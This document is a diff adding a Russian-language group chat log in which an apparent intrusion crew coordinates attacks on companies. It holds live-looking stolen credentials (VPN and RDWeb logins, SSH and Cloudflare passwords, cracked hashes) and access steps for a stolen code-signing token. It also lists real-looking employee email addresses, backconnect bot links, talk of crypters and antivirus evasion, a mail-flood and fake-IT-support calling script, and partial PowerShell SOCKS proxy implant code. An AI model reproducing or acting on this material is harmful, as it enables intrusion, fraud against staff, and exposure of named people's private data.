@@ -1,0 +1,3895 @@
+[2024-06-19 04:51:33] @usernamehunter:matrix.bestflowers247.online: NICK.OLENDORF::MCLARENS:1122334455667788:b2a9b5ee65aeb57da6c4cbea6518fa52:010100000000000085de83c3cbc1da019aa6af8fee5bb7580000000008003000300000000000000000000000002000000c5192e66f7d8ade797004d4edabc075763cbad276157c3ed4eef50425d2abd70a0010000000000000000000000000000000000009002c004d0043004c004100520045004e0053005c004e00690063006b002e004f006c0065006e0064006f00720066000000000000000000:Thor6974$
+
+--------------------
+[2024-06-19 06:18:41] @usernameboy:matrix.bestflowers247.online: > <@usernamejj:matrix.bestflowers247.online> `7f6c2249e956f921ca7cea8d649f7466`
+
+7f6c2249e956f921ca7cea8d649f7466:TochPack6
+
+--------------------
+[2024-06-19 06:48:18] @usernameugway:matrix.bestflowers247.online: доброе утро
+--------------------
+[2024-06-19 07:07:54] @usernamejj:matrix.bestflowers247.online: > <@usernameboy:matrix.bestflowers247.online> 7f6c2249e956f921ca7cea8d649f7466:TochPack6
+
+++
+--------------------
+[2024-06-19 07:19:07] @usernamett:matrix.bestflowers247.online: `45.32.88.233:34781   DERM`
+--------------------
+[2024-06-19 07:20:31] @usernamett:matrix.bestflowers247.online: `45.32.88.233:33587  DERM`
+--------------------
+[2024-06-19 07:24:14] @usernamegg:matrix.bestflowers247.online: доброе утро
+--------------------
+[2024-06-19 07:24:32] @usernamegg:matrix.bestflowers247.online: собрали германию ?
+--------------------
+[2024-06-19 07:24:56] @usernameugway:matrix.bestflowers247.online: акки сделали, сейчас жду чела должен контакты скинуть
+--------------------
+[2024-06-19 07:25:06] @usernameugway:matrix.bestflowers247.online: к 11 все должно быть
+--------------------
+[2024-06-19 07:25:18] @usernamegg:matrix.bestflowers247.online: 94.103.90.9:38023:9Cy5Yiyd:8Qk3UJm5
+--------------------
+[2024-06-19 07:25:23] @usernamegg:matrix.bestflowers247.online: www.beko-technologies.com - Revenue $122.9 Million
+--------------------
+[2024-06-19 07:46:50] @usernameyy:matrix.bestflowers247.online: Теперь отображается только первых 100 акков + 1 акк юзера
+Пофиксил краши на выходе
+надо протестить на больших сетках, где больше 100 акков под моим присмотром
+--------------------
+[2024-06-19 07:47:38] @usernameyy:matrix.bestflowers247.online: AuthForm.exe
+--------------------
+[2024-06-19 07:48:00] @usernameyy:matrix.bestflowers247.online: Отображение убрал чтобы потенциально пофиксить лаги (предполагаю, что из-за этого долго запускалось)
+--------------------
+[2024-06-19 08:02:26] @usernameugway:matrix.bestflowers247.online: чел немножко тупанул, контакты вот-вот будут
+
+а новые мы подгрузим в акки чтоб ускорить процесс
+--------------------
+[2024-06-19 08:11:09] @usernamett:matrix.bestflowers247.online: `https://www.supercoloring.com/ru/holidays/usa/2024`
+--------------------
+[2024-06-19 08:12:56] @usernamemm:matrix.bestflowers247.online: `https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%B0%D0%B7%D0%B4%D0%BD%D0%B8%D0%BA%D0%B8_%D0%A1%D0%A8%D0%90`
+--------------------
+[2024-06-19 08:14:30] @usernamegg:matrix.bestflowers247.online: https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%B0%D0%B7%D0%B4%D0%BD%D0%B8%D0%BA%D0%B8_%D0%A1%D0%A8%D0%90
+
+--------------------
+[2024-06-19 08:14:39] @usernamegg:matrix.bestflowers247.online: https://www.supercoloring.com/ru/holidays/usa/2024
+
+--------------------
+[2024-06-19 08:14:50] @usernamegg:matrix.bestflowers247.online: сегодня юсу нет смысла звонить. (
+--------------------
+[2024-06-19 08:14:56] @usernamegg:matrix.bestflowers247.online: на завтра готовить ее нужно
+--------------------
+[2024-06-19 08:15:01] @usernamegg:matrix.bestflowers247.online: европпу звоним до талого сегодня
+--------------------
+[2024-06-19 08:15:05] @usernameugway:matrix.bestflowers247.online: принял
+--------------------
+[2024-06-19 08:15:33] @usernameugway:matrix.bestflowers247.online: немного проебался с контками сегодня -  на завтра это учтем 100проц
+--------------------
+[2024-06-19 08:15:43] @usernamett:matrix.bestflowers247.online: ```
+https://20.151.200.51/RDWeb/Pages/en-US/login.aspx	nghofari	Spring2024	solid\nghofari $12 Million ++
+https://72.80.167.208/RDWeb/Pages/en-US/login.aspx	dgiardullo	July2021!	truviewbsi\dgiardullo $5.5 Million ++
+https://199.175.7.67/RDWeb/Pages/en-US/login.aspx	sberber	Spring2024!	fasny\sberber fasny.org ++
+```
+--------------------
+[2024-06-19 08:15:43] @usernamegg:matrix.bestflowers247.online: идем потестим
+--------------------
+[2024-06-19 08:15:49] @usernameyy:matrix.bestflowers247.online: \идк
+--------------------
+[2024-06-19 08:15:52] @usernameyy:matrix.bestflowers247.online: иду
+--------------------
+[2024-06-19 08:21:56] @usernameugway:matrix.bestflowers247.online: ----
+--------------------
+[2024-06-19 08:22:05] @usernameugway:matrix.bestflowers247.online: сокс это связь с софтом вашим на тачке?
+--------------------
+[2024-06-19 08:22:14] @usernameugway:matrix.bestflowers247.online: какую функцию он выполняет
+--------------------
+[2024-06-19 08:22:20] @usernameugway:matrix.bestflowers247.online: у меня есть мысль если это так
+--------------------
+[2024-06-19 08:23:43] @usernamegg:matrix.bestflowers247.online: ```
+1. Download and install Yubikey Smartcard Minidriver (https://www.yubico.com/support/download/smart-card-drivers-tools/) and Yubikey Manager (https://www.yubico.com/support/download/yubikey-manager/)
+
+2. Download Virtualhere client: https://www.virtualhere.com/usb_client_software
+
+3. Launch Virtualhere client.
+Right click on USB servers => Specify server => Add.
+Enter:  MHLuYeyYTAxQ6579mg15NS-5TcAT7
+Save.
+
+4. A list of tokens should appear within 20-30 seconds.
+You need Token20, double click to connect.
+Password: GklD17SDm6
+Token PIN: 123456
+
+5. Launch Yubikey Manager and check if the token is visible.
+
+6. Now you can sign your files with signtool.exe.
+Example:
+signtool.exe sign /sha1 <certificate thumbprint> /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 <file to be signed>
+```
+--------------------
+[2024-06-19 08:27:01] @usernamegg:matrix.bestflowers247.online: вот новый фаил
+--------------------
+[2024-06-19 08:27:07] @usernamegg:matrix.bestflowers247.online: только сейчас понадобился
+--------------------
+[2024-06-19 08:27:10] @usernamegg:matrix.bestflowers247.online: все на местах ?
+--------------------
+[2024-06-19 08:27:14] @usernamegg:matrix.bestflowers247.online: ulan.exe
+--------------------
+[2024-06-19 08:27:41] @usernamegg:matrix.bestflowers247.online: [10:24:16] backconnect - socks bot: привет домен заблокировали
+[10:24:16] backconnect - socks bot: сейчас через чат
+[11:24:39] AA: через какой чат ?
+--------------------
+[2024-06-19 08:28:17] @usernamegg:matrix.bestflowers247.online: > <@usernameugway:matrix.bestflowers247.online> сокс это связь с софтом вашим на тачке?
+
+связь это с их сетью
+--------------------
+[2024-06-19 08:28:24] @usernamegg:matrix.bestflowers247.online: что бы можно было всякие манипуляции выполнять
+--------------------
+[2024-06-19 08:30:46] @usernamegg:matrix.bestflowers247.online: ```
+proxychains ssh root@217.15.175.191 = halagifts.com
+PASS: tryrC=njp_D*44*V??B#9yB4C#w8Uio
+
+
+==cloudflare.com==
+gelyaplum@navalcadets.com
+778vJHV.%"#3\F7J\668b
+
+217.15.175.191 = halagifts.com
+```
+--------------------
+[2024-06-19 08:31:45] @usernameugway:matrix.bestflowers247.online: я на тренировку меня мел подменит
+--------------------
+[2024-06-19 08:31:54] @usernameugway:matrix.bestflowers247.online: всем задания раздал скоро будут акки для юк с контктами
+--------------------
+[2024-06-19 08:31:58] @usernameugway:matrix.bestflowers247.online: потом скину тебе статью
+--------------------
+[2024-06-19 08:32:08] @usernameugway:matrix.bestflowers247.online: поймешь идею - может это заменит соксы
+--------------------
+[2024-06-19 08:32:14] @usernameugway:matrix.bestflowers247.online: и будет стабильным конектом
+--------------------
+[2024-06-19 08:33:44] @usernamegg:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+Натив ГО х32, криптует любой, но надо сделать уникально чисто.
+--------------------
+[2024-06-19 08:35:12] @usernameyy:matrix.bestflowers247.online: AuthForm.exe
+--------------------
+[2024-06-19 08:40:31] @lincoln:artronica.rocks: добрый день
+--------------------
+[2024-06-19 08:40:44] @lincoln:artronica.rocks: готов
+--------------------
+[2024-06-19 08:42:52] @mel:artronica.rocks: привет
+--------------------
+[2024-06-19 08:43:17] @mel:artronica.rocks: скоро будут таргеты
+--------------------
+[2024-06-19 08:43:45] @lincoln:artronica.rocks: 🏴󠁧󠁢󠁷󠁬󠁳󠁿
+--------------------
+[2024-06-19 08:43:59] @lincoln:artronica.rocks: @lincoln:artronica.rocks is requesting to verify your key, but your client does not support in-chat key verification. You will need to use legacy key verification to verify keys.
+--------------------
+[2024-06-19 08:46:35] @usernamegg:matrix.bestflowers247.online: привет
+--------------------
+[2024-06-19 08:46:37] @usernamegg:matrix.bestflowers247.online: ты чего ?
+--------------------
+[2024-06-19 08:46:51] @lincoln:artronica.rocks: а нет я просто добавил
+--------------------
+[2024-06-19 08:46:52] @usernamegg:matrix.bestflowers247.online: поменял аву
+--------------------
+[2024-06-19 08:46:52] @lincoln:artronica.rocks: брат
+--------------------
+[2024-06-19 08:46:59] @lincoln:artronica.rocks: ну да
+--------------------
+[2024-06-19 08:47:03] @lincoln:artronica.rocks: у меня пустой аккаунт
+--------------------
+[2024-06-19 08:47:09] @usernamegg:matrix.bestflowers247.online: понял
+--------------------
+[2024-06-19 08:47:18] @lincoln:artronica.rocks: сейчас я coca call
+--------------------
+[2024-06-19 08:48:01] @lincoln:artronica.rocks: я просто тебя добавил в trusted )
+--------------------
+[2024-06-19 08:48:35] @usernamegg:matrix.bestflowers247.online: скинь сейчас
+--------------------
+[2024-06-19 08:48:37] @usernamegg:matrix.bestflowers247.online: статью
+--------------------
+[2024-06-19 08:48:39] @usernamegg:matrix.bestflowers247.online: что за идея
+--------------------
+[2024-06-19 08:48:56] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 08:49:12] @usernameyy:matrix.bestflowers247.online: Han: burrito у вас есть крипт который в другой процесс инжектится, чтобы файл не занимать?
+--------------------
+[2024-06-19 08:49:19] @usernamegg:matrix.bestflowers247.online: сейчас они контакты соберут начнем звонить
+--------------------
+[2024-06-19 08:49:24] @usernamegg:matrix.bestflowers247.online: я пока файлы готовлю
+--------------------
+[2024-06-19 08:49:32] @lincoln:artronica.rocks: да конечно
+--------------------
+[2024-06-19 08:49:36] @usernamegg:matrix.bestflowers247.online: там все снимать успеваю но конект не стабильный
+--------------------
+[2024-06-19 08:49:45] @usernameugway:matrix.bestflowers247.online: надо найти я ее кидал 100проц
+--------------------
+[2024-06-19 08:49:45] @usernamegg:matrix.bestflowers247.online: старадюсь отладить
+--------------------
+[2024-06-19 08:49:50] @usernameugway:matrix.bestflowers247.online: связь с маяками черзе тимс
+--------------------
+[2024-06-19 08:49:54] @usernameugway:matrix.bestflowers247.online: найду чуть позже
+--------------------
+[2024-06-19 08:49:54] @lincoln:artronica.rocks: где там ?
+--------------------
+[2024-06-19 08:49:55] @usernamegg:matrix.bestflowers247.online: главное что заходить и ставить по для антиспама )
+--------------------
+[2024-06-19 08:50:03] @usernamegg:matrix.bestflowers247.online: на пк жертвы
+--------------------
+[2024-06-19 08:50:05] @lapa:matrix.bestflowers247.online: Привет! Ок
+--------------------
+[2024-06-19 08:50:14] @usernamegg:matrix.bestflowers247.online: ок
+--------------------
+[2024-06-19 08:50:16] @lincoln:artronica.rocks: а ну я норм или не очень ?
+--------------------
+[2024-06-19 08:50:20] @lincoln:artronica.rocks: в плане работы
+--------------------
+[2024-06-19 08:50:42] @lincoln:artronica.rocks: я просто первый раз через teams работаю
+--------------------
+[2024-06-19 08:50:45] @lapa:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> [10:24:16] backconnect - socks bot: привет домен заблокировали
+> [10:24:16] backconnect - socks bot: сейчас через чат
+> [11:24:39] AA: через какой чат ?
+
+наверное вы ему в чате даете домен, а он вам сгенерит
+--------------------
+[2024-06-19 08:51:20] @usernamegg:matrix.bestflowers247.online: teams для нашей работы это успешные дозвоны в компании
+--------------------
+[2024-06-19 08:52:03] @lincoln:artronica.rocks: я просто хочу понять уровень одного прозвона
+--------------------
+[2024-06-19 08:52:06] @usernamegg:matrix.bestflowers247.online: > <@lincoln:artronica.rocks> а ну я норм или не очень ?
+
+норм, но ты немного импульсивный , но в целом отлично , главное что бы ты мог разводить их на то что бы дали доступ
+--------------------
+[2024-06-19 08:52:07] @lincoln:artronica.rocks: сколько таргетов в день
+--------------------
+[2024-06-19 08:52:14] @usernamegg:matrix.bestflowers247.online: мы им закидываем почту флудом
+--------------------
+[2024-06-19 08:52:21] @usernamegg:matrix.bestflowers247.online: потом считай они мучаются
+--------------------
+[2024-06-19 08:52:21] @lincoln:artronica.rocks: да это я понимаю
+--------------------
+[2024-06-19 08:52:45] @lincoln:artronica.rocks: да я импульсивный, когда срывается звонок из за подсознания работника
+--------------------
+[2024-06-19 08:52:54] @lincoln:artronica.rocks: у него регламент включается
+--------------------
+[2024-06-19 08:52:59] @usernamegg:matrix.bestflowers247.online: ты приходишь такой герой говришь у вас спам на нашу компанию спам аттака , надо поставить ПО для антиспама сейчас я к вам подключусь
+--------------------
+[2024-06-19 08:53:08] @lincoln:artronica.rocks: ))) братан )
+--------------------
+[2024-06-19 08:53:09] @usernamegg:matrix.bestflowers247.online: говоришь ставь эни деск или тимвивер
+--------------------
+[2024-06-19 08:53:11] @lapa:matrix.bestflowers247.online: VALID_BRUT_CISCO.txt
+--------------------
+[2024-06-19 08:53:12] @lapa:matrix.bestflowers247.online: VALID_BRUT_RDWEB.txt
+--------------------
+[2024-06-19 08:53:12] @lapa:matrix.bestflowers247.online: VALID_BRUT_SONIC.txt
+--------------------
+[2024-06-19 08:53:13] @lincoln:artronica.rocks: я это все понимаю )
+--------------------
+[2024-06-19 08:53:16] @lincoln:artronica.rocks: я про другое
+--------------------
+[2024-06-19 08:53:23] @lincoln:artronica.rocks: даш мне как нибудь свой тимз
+--------------------
+[2024-06-19 08:53:27] @lincoln:artronica.rocks: послушаешь меня
+--------------------
+[2024-06-19 08:53:41] @usernamegg:matrix.bestflowers247.online: хорошо
+--------------------
+[2024-06-19 08:53:47] @lincoln:artronica.rocks: мне нужно понять сколько у вас таргетов делал лучший прозвон в день
+--------------------
+[2024-06-19 08:53:53] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> наверное вы ему в чате даете домен, а он вам сгенерит
+
+уже дал да
+--------------------
+[2024-06-19 08:54:17] @usernameugway:matrix.bestflowers247.online: https://redsiege.com/blog/2024/01/graphstrike-developer/
+--------------------
+[2024-06-19 08:54:34] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> наверное вы ему в чате даете домен, а он вам сгенерит
+
+[11:47:06] backconnect - socks bot: тебе линукс и винду сделать?
+[11:47:24] backconnect - socks bot: LINUX: https://backconnect.org/?id=da898393512221b7e5550400ed60cf8d
+WINDOWS: https://backconnect.org/?id=3fcf3b20a30097c44835e3be3cb7d980
+
+NEW: https://backconnect.org/?id=34d53bf811de63e7a2b0bf86a7462f32&generate
+[11:49:50] backconnect - socks bot: NEW: https://backconnect.org/?id=34d53bf811de63e7a2b0bf86a7462f32&generate
+
+здесь у тебя был чистый windows bot
+[11:50:16] backconnect - socks bot: linux остался 1 билд
+[11:50:36] backconnect - socks bot: на 443 порт генерировать?
+[11:54:21] AA: да
+[11:54:22] AA: 443
+--------------------
+[2024-06-19 08:55:20] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-06-19 08:55:56] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 08:55:59] @usernamegg:matrix.bestflowers247.online: https://redsiege.com/blog/2024/01/graphstrike-developer/
+--------------------
+[2024-06-19 08:57:02] @usernamegg:matrix.bestflowers247.online: 5 за час
+--------------------
+[2024-06-19 08:57:41] @lincoln:artronica.rocks: а как он может делать 5 за час ?
+--------------------
+[2024-06-19 08:58:10] @usernameugway:matrix.bestflowers247.online: все буду через  1.15  пошел потреню
+--------------------
+[2024-06-19 08:58:45] @lincoln:artronica.rocks: если когда я отдаю вам таргет
+--------------------
+[2024-06-19 08:58:49] @lapa:matrix.bestflowers247.online: AUTH_VALID.txt
+--------------------
+[2024-06-19 08:58:50] @lapa:matrix.bestflowers247.online: CISCO_VALID_ITEMS.txt
+--------------------
+[2024-06-19 08:58:51] @lapa:matrix.bestflowers247.online: FORTI_VALID.txt
+--------------------
+[2024-06-19 08:58:51] @lapa:matrix.bestflowers247.online: SONIC_VALID.txt
+--------------------
+[2024-06-19 08:58:52] @lapa:matrix.bestflowers247.online: WG_VALID.txt
+--------------------
+[2024-06-19 08:58:52] @lincoln:artronica.rocks: вы мне говорите ждать час )
+--------------------
+[2024-06-19 09:00:21] @usernamegg:matrix.bestflowers247.online: это когда полный пиздейшен на тачке стоит тогда час , когда легие ав ясразу все уснимаю и если все стучит то установка софтна занимает 5 минут и мы отпускает таргет.
+--------------------
+[2024-06-19 09:00:42] @lincoln:artronica.rocks: просто у меня все таргеты от часа
+--------------------
+[2024-06-19 09:00:46] @lincoln:artronica.rocks: были
+--------------------
+[2024-06-19 09:00:52] @usernamegg:matrix.bestflowers247.online: когда та ав такие как фалкон , карбон , софос я начинаю мучатся
+--------------------
+[2024-06-19 09:01:06] @lincoln:artronica.rocks: 50 таргетов в сутки получается
+--------------------
+[2024-06-19 09:01:17] @usernamegg:matrix.bestflowers247.online: такого не было еще
+--------------------
+[2024-06-19 09:01:24] @lincoln:artronica.rocks: ну вот нам надо
+--------------------
+[2024-06-19 09:01:27] @lincoln:artronica.rocks: мне надо
+--------------------
+[2024-06-19 09:01:39] @usernamegg:matrix.bestflowers247.online: 5 в сутки стабильно это хороший результат
+--------------------
+[2024-06-19 09:01:42] @mel:artronica.rocks: ты здесь?
+--------------------
+[2024-06-19 09:01:42] @mel:artronica.rocks: привет
+--------------------
+[2024-06-19 09:01:42] @lincoln:artronica.rocks: поэтому давай сейчас юк отработаю на высшем уровне
+--------------------
+[2024-06-19 09:01:45] @usernamegg:matrix.bestflowers247.online: было за час 5 шт
+--------------------
+[2024-06-19 09:01:50] @mel:artronica.rocks: Server IP address: 94.131.112.42
+User: Admin
+Password: 5FuFkcOPCRN7
+--------------------
+[2024-06-19 09:01:53] @mel:artronica.rocks: клиент здесь
+--------------------
+[2024-06-19 09:02:06] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 09:02:22] @usernamegg:matrix.bestflowers247.online: тебе какой заработок в месяц нужен ?
+--------------------
+[2024-06-19 09:02:28] @lincoln:artronica.rocks: 30-50к
+--------------------
+[2024-06-19 09:02:33] @usernamegg:matrix.bestflowers247.online: что бы закрыть все свои базовые потребности
+--------------------
+[2024-06-19 09:02:49] @lincoln:artronica.rocks: ну у меня такой заработок норм для меня
+--------------------
+[2024-06-19 09:02:49] @mel:artronica.rocks: аууууууууууууууууу
+--------------------
+[2024-06-19 09:03:04] @usernamegg:matrix.bestflowers247.online: как ты понял что именно мне нужно писать ?
+--------------------
+[2024-06-19 09:03:13] @usernamegg:matrix.bestflowers247.online: я вроде не выделяюсь )
+--------------------
+[2024-06-19 09:03:28] @usernamegg:matrix.bestflowers247.online: дааа
+--------------------
+[2024-06-19 09:03:28] @lincoln:artronica.rocks: я просто добавил тебя
+--------------------
+[2024-06-19 09:03:29] @usernamegg:matrix.bestflowers247.online: я тут
+--------------------
+[2024-06-19 09:03:30] @usernamegg:matrix.bestflowers247.online: иду
+--------------------
+[2024-06-19 09:03:39] @mel:artronica.rocks: файлы там
+--------------------
+[2024-06-19 09:03:40] @muaddib6:matrix.org: Занимаюсь
+--------------------
+[2024-06-19 09:03:42] @mel:artronica.rocks: как обычно
+--------------------
+[2024-06-19 09:03:48] @usernamegg:matrix.bestflowers247.online: обновляем
+--------------------
+[2024-06-19 09:03:49] @usernamegg:matrix.bestflowers247.online: файлы
+--------------------
+[2024-06-19 09:03:49] @mel:artronica.rocks: запустил первый файл
+--------------------
+[2024-06-19 09:03:50] @lincoln:artronica.rocks: ну логически понятно как-то
+--------------------
+[2024-06-19 09:03:50] @mel:artronica.rocks: и третий
+--------------------
+[2024-06-19 09:03:52] @usernamegg:matrix.bestflowers247.online: теперь без батника все
+--------------------
+[2024-06-19 09:03:58] @lincoln:artronica.rocks: мне нужно понять алгоритм
+--------------------
+[2024-06-19 09:04:03] @mel:artronica.rocks: больше не делал ничего
+--------------------
+[2024-06-19 09:04:06] @mel:artronica.rocks: заходи
+--------------------
+[2024-06-19 09:04:07] @lincoln:artronica.rocks: я работал в с классе раньше
+--------------------
+[2024-06-19 09:04:27] @usernamegg:matrix.bestflowers247.online: третий вообще не надо былоо
+--------------------
+[2024-06-19 09:04:34] @usernamegg:matrix.bestflowers247.online: ввели креды ?
+--------------------
+[2024-06-19 09:04:34] @muaddib6:matrix.org: > <@usernameyy:matrix.bestflowers247.online> Han: burrito у вас есть крипт который в другой процесс инжектится, чтобы файл не занимать?
+
+А в какой надо процесс инжектить? Напиши плиз тз
+--------------------
+[2024-06-19 09:04:38] @mel:artronica.rocks: ты идешь?
+--------------------
+[2024-06-19 09:04:40] @mel:artronica.rocks: нет
+--------------------
+[2024-06-19 09:04:43] @mel:artronica.rocks: креды не вводили
+--------------------
+[2024-06-19 09:04:55] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 09:04:57] @mel:artronica.rocks: вижу
+--------------------
+[2024-06-19 09:04:59] @mel:artronica.rocks: зашел
+--------------------
+[2024-06-19 09:05:06] @usernamegg:matrix.bestflowers247.online: ага
+--------------------
+[2024-06-19 09:05:48] @usernameyy:matrix.bestflowers247.online: вообще любой, хоть самому спавнить rundll
+--------------------
+[2024-06-19 09:05:58] @usernameyy:matrix.bestflowers247.online: лишь бы мигрировать куда нибудь из основного
+--------------------
+[2024-06-19 09:08:39] @usernamegg:matrix.bestflowers247.online: акк куда ?
+--------------------
+[2024-06-19 09:08:55] @mel:artronica.rocks: не туда)
+--------------------
+[2024-06-19 09:09:16] @mel:artronica.rocks: JoeCarr@wtwcocom.onmicrosoft.com
+
+
+aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 09:09:21] @mel:artronica.rocks: заходи в акк
+--------------------
+[2024-06-19 09:09:35] @mel:artronica.rocks: sally.irvine@wtwco.com
+omar.ashraf@wtwco.com
+priti.soni@wtwco.com
+clare.lewis@willistowerswatson.com
+daniel.brzezinski@wtwco.com
+josh.adamson@wtwco.com
+ricky.shah@wtwco.com
+simon.richards@willistowerswatson.com
+ciara.knight@wtwco.com
+esme.martin@wtwco.com
+katie.creedon@wtwco.com
+katrina.mccluskie@wtwco.com
+regina.csek@wtwco.com
+taylor.lee@wtwco.com
+alloysius.dsouza@willistowerswatson.com
+emma.hanson@wtwco.com
+saad.altaf@wtwco.com
+amanda.duffield@wtwco.com
+suzie.austen@willistowerswatson.com
+karen.liu@wtwco.com
+shuaib.boomgaard@wtwco.com
+nora.odonovan@willistowerswatson.com
+seda.gunes@wtwco.com
+simranjeet.singh@wtwco.com
+esther.ball@willistowerswatson.com
+madhuri.sheth@wtwco.com
+apoorva.shah@wtwco.com
+sophie.hansford@wtwco.com
+nikol.box@wtwco.com
+jenny.kriekouki@willistowerswatson.com
+anusha.vamadeva@wtwco.com
+alexander.dungate@willistowerswatson.com
+
+--------------------
+[2024-06-19 09:09:42] @mel:artronica.rocks: добавляй пока
+--------------------
+[2024-06-19 09:09:48] @mel:artronica.rocks: ставлю спам
+--------------------
+[2024-06-19 09:09:54] @mel:artronica.rocks: отпишу как начинаем
+--------------------
+[2024-06-19 09:09:56] @usernamegg:matrix.bestflowers247.online: > <@lincoln:artronica.rocks> я работал в с классе раньше
+
+ааа добро пожаловать )
+--------------------
+[2024-06-19 09:10:05] @usernamegg:matrix.bestflowers247.online: а мы с квак бота )
+--------------------
+[2024-06-19 09:10:24] @usernamegg:matrix.bestflowers247.online: в s классе я тоже работал пока одного товарища не приняли в европе
+--------------------
+[2024-06-19 09:10:29] @usernamegg:matrix.bestflowers247.online: танка знал ведь ?
+--------------------
+[2024-06-19 09:10:31] @muaddib6:matrix.org: > <@usernameyy:matrix.bestflowers247.online> вообще любой, хоть самому спавнить rundll
+
+Да. Можно так
+--------------------
+[2024-06-19 09:10:34] @muaddib6:matrix.org: Что сделать?
+--------------------
+[2024-06-19 09:10:36] @lincoln:artronica.rocks: да конечно
+--------------------
+[2024-06-19 09:10:38] @lincoln:artronica.rocks: танка
+--------------------
+[2024-06-19 09:10:40] @lincoln:artronica.rocks: пирата
+--------------------
+[2024-06-19 09:10:40] @muaddib6:matrix.org: длл шк без проблем
+--------------------
+[2024-06-19 09:10:42] @lincoln:artronica.rocks: харрис
+--------------------
+[2024-06-19 09:10:44] @lincoln:artronica.rocks: голд
+--------------------
+[2024-06-19 09:10:45] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 09:11:15] @usernamegg:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> в s классе я тоже работал пока одного товарища не приняли в европе
+
+но у нас там уходили таргеты
+--------------------
+[2024-06-19 09:11:25] @lincoln:artronica.rocks: ну да
+--------------------
+[2024-06-19 09:11:28] @lincoln:artronica.rocks: я по банкам
+--------------------
+[2024-06-19 09:11:29] @lincoln:artronica.rocks: работал
+--------------------
+[2024-06-19 09:11:33] @usernameyy:matrix.bestflowers247.online: как запрашивать правильно в будущем?
+--------------------
+[2024-06-19 09:11:38] @lincoln:artronica.rocks: токены и переадресация звонка
+--------------------
+[2024-06-19 09:11:42] @usernameyy:matrix.bestflowers247.online: чтобы без лишних сообщений)
+--------------------
+[2024-06-19 09:11:47] @lincoln:artronica.rocks: я на всех на них работал
+--------------------
+[2024-06-19 09:11:54] @lincoln:artronica.rocks: отп перехваты
+--------------------
+[2024-06-19 09:12:19] @lincoln:artronica.rocks: ну сколько команд было все и выруливал
+--------------------
+[2024-06-19 09:12:31] @usernameyy:matrix.bestflowers247.online: AuthForm.exe
+--------------------
+[2024-06-19 09:13:01] @muaddib6:matrix.org: Просто пиши при выдаче инжект в другой процесс.
+--------------------
+[2024-06-19 09:13:06] @muaddib6:matrix.org: Я буду понимать
+--------------------
+[2024-06-19 09:14:00] @lincoln:artronica.rocks: > <@usernamegg:matrix.bestflowers247.online> в s классе я тоже работал пока одного товарища не приняли в европе
+
+да там уже и смысла работать не было
+--------------------
+[2024-06-19 09:14:10] @lincoln:artronica.rocks: хотя еще год назад работали на нем
+--------------------
+[2024-06-19 09:20:55] @usernamegg:matrix.bestflowers247.online: qwertyuio.txt
+--------------------
+[2024-06-19 09:27:40] @usernameyy:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> sent a file.
+
+.
+--------------------
+[2024-06-19 09:28:22] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-06-19 в 12.28.07.png
+--------------------
+[2024-06-19 09:28:30] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-06-19 в 12.27.54.png
+--------------------
+[2024-06-19 09:29:40] @usernameyy:matrix.bestflowers247.online: ```
+
+
+function TryWaitForBuffer
+{
+param(
+[Parameter(Position=0)]
+[System.Object[]]$tcp,
+
+[Parameter(Position=1)]
+[int]$count,
+[Parameter(Position=2)]
+[int]$timeout
+)
+
+$start = [DateTime]::Now;
+do
+{
+if ($tcp.Available -ge $count)
+{
+return $True;
+}
+Start-Sleep -Milliseconds 1;
+}
+while (([DateTime]::Now - $start).TotalSeconds -lt $timeout);
+return $False;
+
+}
+$sb = {
+
+param( $b64guid, $serverAddress, $serverPort )
+function TryWaitForBuffer
+{
+param(
+[Parameter(Position=0)]
+[System.Object[]]$tcp,
+
+[Parameter(Position=1)]
+[int]$count,
+[Parameter(Position=2)]
+[int]$timeout
+)
+
+$start = [DateTime]::Now;
+do
+{
+if ($tcp.Available -ge $count)
+{
+return $True;
+}
+Start-Sleep -Milliseconds 1;
+}
+while (([DateTime]::Now - $start).TotalSeconds -lt $timeout);
+return $False;
+
+}
+
+
+
+function HandleClient($sock, $mainTcp) {
+
+$buf = new-object System.Byte[] 8192
+$ret = 0;
+
+TryWaitForBuffer($mainTcp, 4, 10);
+$recvd = $sock.Receive($buf, 4, 0);
+
+$targetTcp = 0;
+Write-Output "Job recvd: $($recvd) av: $($mainTcp.Available) connected: $($mainTcp.Connected)";
+if ($recvd -gt 0)
+{
+if ($buf[0] -eq 5) {
+
+}
+
+$methodCount = $buf[1];
+
+Write-Host "Method count: $($methodCount)";
+
+for ($i = 0; $i -lt $methodCount; $i++)
+{
+if ($buf[2 + $i] -eq 0) {
+$buf[0] = 5;
+$buf[1] = 0;
+$mainTcp.Client.Send($buf, 2, 0);
+break;
+}
+}
+$recvd = $sock.Receive($buf, 4, 0);
+if ($recvd -eq 4) {
+
+if ($buf[3] -eq 1) {
+
+$sock.Receive($buf, 4, 0);
+[byte[]]$bIpaddress = $buf[0..3];
+$intAddress = [BitConverter]::ToUInt32($bIpaddress, 0);
+$destAddress = New-Object System.Net.IPAddress($intAddress);
+$sock.Receive($buf, 2, 0);
+$bPort = $buf[0..1];
+[System.Array]::Reverse($bPort);
+
+$port = [BitConverter]::ToUInt16($bPort, 0);
+$connectionStatus = ConnectDestinationIpv4 $port $destAddress ([ref]$targetTcp)
+
+Write-Host "Connection $($connectionStatus) to $($destAddress):$($port)"
+if ($connectionStatus -eq $False)
+{
+return -1;
+}
+
+$sentStatus = SendResponse $sock $destAddress 4 $port 1
+Write-Host "Sent $($sentStatus) to $($destAddress):$($port)"
+if ($sentStatus -eq $False) {
+
+return -1;
+}
+}
+elseif ($buf[3] -eq 3) {
